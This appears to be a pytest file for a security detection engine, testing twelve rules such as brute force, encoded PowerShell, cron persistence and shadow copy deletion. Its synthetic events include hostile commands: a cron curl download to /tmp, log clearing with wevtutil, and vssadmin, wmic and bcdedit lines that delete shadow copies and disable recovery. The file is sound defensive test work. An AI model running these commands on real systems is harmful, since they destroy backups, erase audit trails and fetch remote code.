"""One test per shipped rule: something it must catch, and something it must leave alone."""
from datetime import datetime, timedelta, timezone

from engine.engine import evaluate

T0 = datetime(2026, 1, 12, 9, 0, tzinfo=timezone.utc)
_ids = iter(range(1, 10**6))


def ev(sec=0, **fields):
    return {"id": f"t{next(_ids)}", "ts": (T0 + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%SZ"), **fields}


def fire(rules, rule_id, events):
    return evaluate([rules[rule_id]], events)


def login(sec, ok=False, user="alice", ip="198.51.100.5", country="US"):
    return ev(sec, category="authentication", event_type="login_success" if ok else "login_failure",
              user=user, src_ip=ip, geo_country=country)


def proc(cmd, **fields):
    return ev(product="windows", category="process_creation", command_line=cmd, **fields)


def test_ss001_brute_force(rules):
    assert len(fire(rules, "SS-001", [login(i * 10) for i in range(10)])) == 1
    assert not fire(rules, "SS-001", [login(i * 10) for i in range(9)])
    assert not fire(rules, "SS-001", [login(i * 60) for i in range(10)])  # too slow for the window
    assert not fire(rules, "SS-001", [login(i * 10, ok=True) for i in range(10)])


def test_ss002_impossible_travel(rules):
    assert len(fire(rules, "SS-002", [login(0, True, country="US"), login(900, True, country="RO")])) == 1
    assert not fire(rules, "SS-002", [login(0, True, country="US"), login(900, True, country="US")])
    assert not fire(rules, "SS-002", [login(0, True, country="US"), login(7200, True, country="RO")])


def test_ss003_encoded_powershell(rules):
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    blob = "ZGVtby1vbmx5ZGVtbw=="
    assert fire(rules, "SS-003", [proc(f"powershell.exe -NoProfile -EncodedCommand {blob}", image=ps)])
    assert fire(rules, "SS-003", [proc(f"powershell.exe -enc {blob}", image=ps)])
    assert not fire(rules, "SS-003", [proc("powershell.exe -File backup.ps1 -Encoding utf8", image=ps)])
    assert not fire(rules, "SS-003", [proc(f"notepad.exe -enc {blob}", image=r"C:\Windows\notepad.exe")])


def test_ss004_new_admin_user(rules):
    def acct(sec, etype, **fields):
        return ev(sec, product="windows", category="account_management", event_type=etype, target_user="svc-upd", **fields)

    create, add = acct(0, "account_created"), acct(60, "group_add", group="Administrators")
    assert len(fire(rules, "SS-004", [create, add])) == 1
    assert not fire(rules, "SS-004", [create, acct(60, "group_add", group="Backup Operators")])
    assert not fire(rules, "SS-004", [add])
    assert not fire(rules, "SS-004", [create, acct(3600, "group_add", group="Administrators")])


def test_ss005_log_clearing(rules):
    assert fire(rules, "SS-005", [ev(product="windows", event_type="log_cleared", log_name="Security")])
    assert fire(rules, "SS-005", [proc("wevtutil.exe cl Security")])
    assert not fire(rules, "SS-005", [proc("wevtutil.exe qe Security")])


def test_ss006_mass_file_rename(rules):
    def rename(sec, changed=True):
        return ev(sec, category="file_event", event_type="file_rename", host="wks-1", ext_changed=changed)

    assert len(fire(rules, "SS-006", [rename(i) for i in range(25)])) == 1
    assert not fire(rules, "SS-006", [rename(i) for i in range(24)])
    assert not fire(rules, "SS-006", [rename(i, changed=False) for i in range(40)])
    assert not fire(rules, "SS-006", [rename(i * 5) for i in range(25)])


def test_ss007_cron_persistence(rules):
    def cron(command):
        return ev(product="linux", category="file_event", event_type="cron_modified", command=command)

    assert fire(rules, "SS-007", [cron("*/5 * * * * curl -s http://203.0.113.7/u.txt -o /tmp/.u")])
    assert fire(rules, "SS-007", [cron("@reboot /tmp/.x")])
    assert not fire(rules, "SS-007", [cron("/usr/local/bin/backup.sh --upload /tmp/staging")])
    assert not fire(rules, "SS-007", [cron("*/15 * * * * /opt/app/run.sh")])


def test_ss008_suspicious_dns_length(rules):
    def dns(sec, length):
        return ev(sec, category="dns", event_type="dns_query", host="wks-1", query_length=length)

    assert len(fire(rules, "SS-008", [dns(i * 10, 80) for i in range(5)])) == 1
    assert not fire(rules, "SS-008", [dns(i * 10, 80) for i in range(4)])
    assert not fire(rules, "SS-008", [dns(i * 10, 40) for i in range(10)])


def test_ss009_password_spraying(rules):
    spray = lambda n: [login(i * 20, user=f"u{i}", ip="198.51.100.9") for i in range(n)]  # noqa: E731
    assert len(fire(rules, "SS-009", spray(8))) == 1
    assert not fire(rules, "SS-009", spray(7))
    assert not fire(rules, "SS-009", [login(i * 20) for i in range(12)])  # one user is brute force, not spraying


def test_ss010_shadow_copy_deletion(rules):
    assert fire(rules, "SS-010", [proc("vssadmin.exe delete shadows /all /quiet")])
    assert fire(rules, "SS-010", [proc("wmic shadowcopy delete")])
    assert fire(rules, "SS-010", [proc("bcdedit /set {default} recoveryenabled no")])
    assert not fire(rules, "SS-010", [proc("vssadmin list shadows")])


def test_ss011_authorized_keys_modified(rules):
    def keys(process, path="/home/deploy/.ssh/authorized_keys"):
        return ev(product="linux", category="file_event", event_type="file_modified", process=process, path=path)

    assert fire(rules, "SS-011", [keys("bash")])
    assert not fire(rules, "SS-011", [keys("ansible")])
    assert not fire(rules, "SS-011", [keys("bash", path="/home/deploy/.bashrc")])


def test_ss012_office_spawns_shell(rules):
    def spawn(parent, child):
        return ev(product="windows", category="process_creation", parent_image=parent, image=child)

    cmd = r"C:\Windows\System32\cmd.exe"
    assert fire(rules, "SS-012", [spawn(r"C:\Office\WINWORD.EXE", cmd)])
    assert not fire(rules, "SS-012", [spawn(r"C:\Windows\explorer.exe", cmd)])
    assert not fire(rules, "SS-012", [spawn(r"C:\Office\WINWORD.EXE", r"C:\Windows\notepad.exe")])
